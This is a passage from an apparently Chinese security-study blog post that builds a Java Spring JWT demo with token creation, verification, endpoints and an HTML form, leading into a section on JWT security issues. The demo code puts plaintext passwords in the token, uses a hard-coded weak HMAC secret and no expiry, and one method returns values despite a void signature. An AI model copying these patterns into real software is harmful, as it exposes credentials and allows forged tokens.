</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">package com.example.testjwtdemo.demos.web;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import com.auth0.jwt.JWT;
</span></span><span class="line"><span class="cl">import com.auth0.jwt.algorithms.Algorithm;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import java.io.UnsupportedEncodingException;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">public class JwtController {
</span></span><span class="line"><span class="cl">    //模拟用户jwt身份创建
</span></span><span class="line"><span class="cl">    public static void main(String[] args) throws UnsupportedEncodingException {
</span></span><span class="line"><span class="cl">        String jwttoken = JWT.create()
</span></span><span class="line"><span class="cl">                // 设置header
</span></span><span class="line"><span class="cl">                //.withHeader()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                // 设置payload
</span></span><span class="line"><span class="cl">                .withClaim(&#34;userid&#34;, &#34;1&#34;)
</span></span><span class="line"><span class="cl">                .withClaim(&#34;username&#34;, &#34;admin&#34;)
</span></span><span class="line"><span class="cl">                .withClaim(&#34;password&#34;, &#34;123456&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                // 设置时效（JWT过期时间）
</span></span><span class="line"><span class="cl">                //.withExpiresAt()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                // 设置signature
</span></span><span class="line"><span class="cl">                .sign(Algorithm.HMAC256(&#34;xiaodisec&#34;));
</span></span><span class="line"><span class="cl">        System.out.println(jwttoken);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397417218200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397417218200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397417218200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397417218200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397417218200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E
</span></span><span class="line"><span class="cl">header：eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
</span></span><span class="line"><span class="cl">payload：eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0
</span></span><span class="line"><span class="cl">Signature：q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><a href="https://jwt.io/">https://jwt.io/</a></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900132.png" style="max-width: 100%; height: auto;"></p>
<h4 id="3模拟jwt加解密">3、模拟jwt加解密<a hidden class="anchor" aria-hidden="true" href="#3模拟jwt加解密">#</a></h4>
<div class="code-block-container" id="code-1769750397417218200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397417218200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397417218200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397417218200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397417218200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span><span class="lnt" id="47"><span class="lnlinks">47</span>
</span><span class="lnt" id="48"><span class="lnlinks">48</span>
</span><span class="lnt" id="49"><span class="lnlinks">49</span>
</span><span class="lnt" id="50"><span class="lnlinks">50</span>
</span><span class="lnt" id="51"><span class="lnlinks">51</span>
</span><span class="lnt" id="52"><span class="lnlinks">52</span>
</span><span class="lnt" id="53"><span class="lnlinks">53</span>
</span><span class="lnt" id="54"><span class="lnlinks">54</span>
</span><span class="lnt" id="55"><span class="lnlinks">55</span>
</span><span class="lnt" id="56"><span class="lnlinks">56</span>
</span><span class="lnt" id="57"><span class="lnlinks">57</span>
</span><span class="lnt" id="58"><span class="lnlinks">58</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">package com.example.testjwtdemo.demos.web;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import com.auth0.jwt.JWT;
</span></span><span class="line"><span class="cl">import com.auth0.jwt.JWTVerifier;
</span></span><span class="line"><span class="cl">import com.auth0.jwt.algorithms.Algorithm;
</span></span><span class="line"><span class="cl">import com.auth0.jwt.interfaces.DecodedJWT;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import java.io.UnsupportedEncodingException;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">public class JwtController {
</span></span><span class="line"><span class="cl">    //模拟用户jwt身份创建  jwt加密
</span></span><span class="line"><span class="cl">    public static void main(String[] args) throws UnsupportedEncodingException {
</span></span><span class="line"><span class="cl">        String jwttoken = JWT.create()
</span></span><span class="line"><span class="cl">                // 设置header
</span></span><span class="line"><span class="cl">                //.withHeader()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                // 设置payload
</span></span><span class="line"><span class="cl">                .withClaim(&#34;userid&#34;, &#34;1&#34;)
</span></span><span class="line"><span class="cl">                .withClaim(&#34;username&#34;, &#34;admin&#34;)
</span></span><span class="line"><span class="cl">                .withClaim(&#34;password&#34;, &#34;123456&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                // 设置时效（JWT过期时间）
</span></span><span class="line"><span class="cl">                //.withExpiresAt()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                // 设置signature
</span></span><span class="line"><span class="cl">                .sign(Algorithm.HMAC256(&#34;xiaodisec&#34;));
</span></span><span class="line"><span class="cl">        System.out.println(jwttoken);
</span></span><span class="line"><span class="cl">        jwtcheck(jwttoken);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    //模拟身份的检测  jwt解密
</span></span><span class="line"><span class="cl">    public static void jwtcheck(String jwtdata) throws UnsupportedEncodingException {
</span></span><span class="line"><span class="cl">        //String jwtdata=&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E&#34;;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        // 构建解密注册
</span></span><span class="line"><span class="cl">        JWTVerifier jwt = JWT.require(Algorithm.HMAC256(&#34;xiaodisec&#34;)).build();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        //解密注册数据
</span></span><span class="line"><span class="cl">        DecodedJWT verify = jwt.verify(jwtdata);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        //提取注册解密数据 payload部分
</span></span><span class="line"><span class="cl">        String userid = verify.getClaim(&#34;userid&#34;).asString();
</span></span><span class="line"><span class="cl">        String username = verify.getClaim(&#34;username&#34;).asString();
</span></span><span class="line"><span class="cl">        String password = verify.getClaim(&#34;password&#34;).asString();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        System.out.println(userid + username + password);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//        提取header部分
</span></span><span class="line"><span class="cl">//        verify.getHeader();
</span></span><span class="line"><span class="cl">//        提取sign签名部分
</span></span><span class="line"><span class="cl">//        verify.getPayload();
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">/*
</span></span><span class="line"><span class="cl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E
</span></span><span class="line"><span class="cl">1admin123456
</span></span><span class="line"><span class="cl">*/</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="4web页面">4、web页面<a hidden class="anchor" aria-hidden="true" href="#4web页面">#</a></h4>
<div class="code-block-container" id="code-1769750397418256200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397418256200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397418256200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397418256200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397418256200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span><span class="lnt" id="47"><span class="lnlinks">47</span>
</span><span class="lnt" id="48"><span class="lnlinks">48</span>
</span><span class="lnt" id="49"><span class="lnlinks">49</span>
</span><span class="lnt" id="50"><span class="lnlinks">50</span>
</span><span class="lnt" id="51"><span class="lnlinks">51</span>
</span><span class="lnt" id="52"><span class="lnlinks">52</span>
</span><span class="lnt" id="53"><span class="lnlinks">53</span>
</span><span class="lnt" id="54"><span class="lnlinks">54</span>
</span><span class="lnt" id="55"><span class="lnlinks">55</span>
</span><span class="lnt" id="56"><span class="lnlinks">56</span>
</span><span class="lnt" id="57"><span class="lnlinks">57</span>
</span><span class="lnt" id="58"><span class="lnlinks">58</span>
</span><span class="lnt" id="59"><span class="lnlinks">59</span>
</span><span class="lnt" id="60"><span class="lnlinks">60</span>
</span><span class="lnt" id="61"><span class="lnlinks">61</span>
</span><span class="lnt" id="62"><span class="lnlinks">62</span>
</span><span class="lnt" id="63"><span class="lnlinks">63</span>
</span><span class="lnt" id="64"><span class="lnlinks">64</span>
</span><span class="lnt" id="65"><span class="lnlinks">65</span>
</span><span class="lnt" id="66"><span class="lnlinks">66</span>
</span><span class="lnt" id="67"><span class="lnlinks">67</span>
</span><span class="lnt" id="68"><span class="lnlinks">68</span>
</span><span class="lnt" id="69"><span class="lnlinks">69</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">package com.example.testjwtdemo.demos.web;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import com.auth0.jwt.JWT;
</span></span><span class="line"><span class="cl">import com.auth0.jwt.JWTVerifier;
</span></span><span class="line"><span class="cl">import com.auth0.jwt.algorithms.Algorithm;
</span></span><span class="line"><span class="cl">import com.auth0.jwt.interfaces.DecodedJWT;
</span></span><span class="line"><span class="cl">import org.springframework.stereotype.Controller;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.PostMapping;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.ResponseBody;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import java.io.UnsupportedEncodingException;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@Controller
</span></span><span class="line"><span class="cl">public class JwtController {
</span></span><span class="line"><span class="cl">    //模拟用户jwt身份创建  jwt加密
</span></span><span class="line"><span class="cl">    @PostMapping(&#34;/jwtcreate&#34;)
</span></span><span class="line"><span class="cl">    @ResponseBody
</span></span><span class="line"><span class="cl">    public static String main(Integer id, String user, String pass) throws UnsupportedEncodingException {
</span></span><span class="line"><span class="cl">        String jwttoken = JWT.create()
</span></span><span class="line"><span class="cl">                // 设置header
</span></span><span class="line"><span class="cl">                //.withHeader()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                // 设置payload
</span></span><span class="line"><span class="cl">                .withClaim(&#34;userid&#34;, id)
</span></span><span class="line"><span class="cl">                .withClaim(&#34;username&#34;, user)
</span></span><span class="line"><span class="cl">                .withClaim(&#34;password&#34;, pass)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                // 设置时效（JWT过期时间）
</span></span><span class="line"><span class="cl">                //.withExpiresAt()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                // 设置signature
</span></span><span class="line"><span class="cl">                .sign(Algorithm.HMAC256(&#34;xiaodisec&#34;));
</span></span><span class="line"><span class="cl">        System.out.println(jwttoken);
</span></span><span class="line"><span class="cl">        return jwttoken;
</span></span><span class="line"><span class="cl">//        jwtcheck(jwttoken);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    //模拟身份的检测  jwt解密
</span></span><span class="line"><span class="cl">    @PostMapping(&#34;/jwtcheck&#34;)
</span></span><span class="line"><span class="cl">    @ResponseBody
</span></span><span class="line"><span class="cl">    public static void jwtcheck(String jwtdata) throws UnsupportedEncodingException {
</span></span><span class="line"><span class="cl">        //String jwtdata=&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6IjEiLCJ1c2VybmFtZSI6ImFkbWluIn0.q5Tci9dIVF4bT1t2P4v_QPoM0hPiDyYbGMWH12EG48E&#34;;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        // 构建解密注册
</span></span><span class="line"><span class="cl">        JWTVerifier jwt = JWT.require(Algorithm.HMAC256(&#34;xiaodisec&#34;)).build();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        //解密注册数据
</span></span><span class="line"><span class="cl">        DecodedJWT verify = jwt.verify(jwtdata);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        //提取注册解密数据 payload部分
</span></span><span class="line"><span class="cl">        Integer userid = verify.getClaim(&#34;userid&#34;).asInt();
</span></span><span class="line"><span class="cl">        String username = verify.getClaim(&#34;username&#34;).asString();
</span></span><span class="line"><span class="cl">        String password = verify.getClaim(&#34;password&#34;).asString();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        System.out.println(userid + username + password);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      if (username.equals(&#34;admin&#34;)) {
</span></span><span class="line"><span class="cl">            return &#34;你是admin&#34;;
</span></span><span class="line"><span class="cl">        }else {
</span></span><span class="line"><span class="cl">            return &#34;你不是admin&#34;;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">//        提取header部分
</span></span><span class="line"><span class="cl">//        verify.getHeader();
</span></span><span class="line"><span class="cl">//        提取sign签名部分
</span></span><span class="line"><span class="cl">//        verify.getSignature();
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>前端页面</p>
<div class="code-block-container" id="code-1769750397419368600" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397419368600">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">html</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397419368600" title="Toggle" aria-expanded="false" aria-controls="code-1769750397419368600" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397419368600-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>hello word!!!<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>this is a html page<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;../jwtcreate&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    id:<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;id&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    user:<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;user&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    pass:<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;pass&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;create&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901363.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901125.png" style="max-width: 100%; height: auto;"></p>
<h3 id="安全问题-2">安全问题<a hidden class="anchor" aria-hidden="true" href="#安全问题-2">#</a></h3>
<p><a href="https://www.cnblogs.com/tomyyyyy/p/15134420.html#jwt%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F">https://www.cnblogs.com/tomyyyyy/p/15134420.html#jwt%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F</a></p>
